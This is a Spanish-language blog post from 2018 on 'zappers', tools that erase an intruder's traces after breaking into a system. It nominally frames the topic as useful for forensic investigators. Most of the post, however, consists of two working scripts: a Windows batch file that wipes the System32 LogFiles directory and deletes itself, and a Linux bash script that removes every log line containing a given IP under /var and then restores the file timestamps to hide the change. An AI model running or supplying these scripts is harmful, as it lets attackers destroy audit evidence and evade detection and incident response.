---
id: 42
title: 'Ocultando Huellas: Zappers'
date: 2018-09-05T08:00:29+00:00
author: Oscar
layout: post
categories:
  - Otros
---

Mucho se habla en internet sobre el como ingresar a un sistema de manera "no autorizada", hay cientos de guías que te detallan paso a paso como explotar ciertas vulnerabilidades del algun producto o tecnología hasta entrar al sistema, pero ¿que hay una vez que entras?, ¿que hay sobre todos los rastros y huellas que vas dejando al momento de entrar?, ¿donde quedan esos registros?, etc.   

**¿Qué son los Zappers?**

Los Zappers son herramientas automatizadas para el borrado de huellas en algún sistema, existen zappers para los principales sistemas operativos, en su mayoria scripts que el usuario puede customizar según sus necesidades.

Para entender donde buscar si te toca hacer un analisis forense de algún incidente de seguridad es muy importante conocer todos estos lugares donde quedan regisros de acceso o de intentos de acceso, registros de comandos ejecutados, registros de eventos, de url consultadas, memorias caches del sistema, archivos temporales, etc.


### Ejemplos de algunos Zappers:

**Windows**:

Zapper sencillisimo en BAT:

```sh
@echo off
rd /s /q %systemroot%\Windows\System32\LogFiles
md %systemroot%\Windows\System32\LogFiles
del /f /q %0
exit
```

Fuente: [underc0deblog](http://underc0deblog.blogspot.cl/2014/03/zapper-para-windows-batch.html)

Winzapper (un antiguo zapper para windows):  
![alt text](https://www.oscarhenriquezg.net/images/2018/09/winzap.png "El antiguo winzap")

Fuente: [ntsecurity](http://ntsecurity.nu/toolbox/winzapper/)


**Linux**:

Un bonito ejemplo de zapper para linux:

```sh
#
############################################################################
# "adk.sh v0.1" hecho por el ..sR. aDiKtO.. &lt;adikto@elhacker.net&gt;
#
# Este script borra todas las lineas de todos los archivos
# que esten en /var que contengan tu ip, conservando la fecha
# de antes de la modificacion .
#
# Este script se distribuye segun la licencia GPL v.2 o posteriores y
# no tiene garantias de ningun tipo. Puede obtener una copia de la
# licencia GPL o ponerse en contacto con la Free Software
# Foundation en http://www.gnu.org
############################################################################
#
# Variable que contiene tu ip
IP="127.0.0.1"
############################################################################
# Funcion encargada de limpiar todos los logs
############################################################################
function main()
{
mkdir -p /tmp/.adk &&gt;/dev/null
for i in `find /var 2&gt;/dev/null`
do
  linea=$(cat $i 2&gt;/dev/null | grep $IP )
  if [ "$linea" != "" ]
  then
      ls -l $i &gt; /tmp/.adk/fecha 2&gt;/dev/null
      aux=$(awk '{ print $6 $7 }' /tmp/.adk/fecha 2&gt;/dev/null)
      TIEMPO=$(echo $aux | tr "-:" "\000" 2&gt;/dev/null)
      sed "/$IP/d" $i &gt; /tmp/.adk/datos 2&gt;/dev/null
      cat /tmp/.adk/datos &gt; $i 2&gt;/dev/null
      touch -t $TIEMPO $i 2&gt;/dev/null
      echo -e "IP limpiada del archivo $i"
  fi
done
rm -rf /tmp/.adk &&gt;/dev/null
}
############################################################################
#Funcion principal
############################################################################
clear
echo -e "\n    \033[40m\033[1;37m  adk.sh v0.1  \033[0m\n"
if [ $GROUPS != 0 ]
then
  echo -e "ERROR: Necesitas tener privilegios de root para poder ejecutar este script"
  exit
fi
echo -e "\n Empecemos a borrar tu ip de los log de este sistema.\n"
main
echo -e "\n Ordenador Limpiado Completamente"
</pre>
```
Fuente: [https://foro.elhacker.net/hacking\_basico/un\_buen_zapper-t26710.0.html](https://foro.elhacker.net/hacking_basico/un_buen_zapper-t26710.0.html)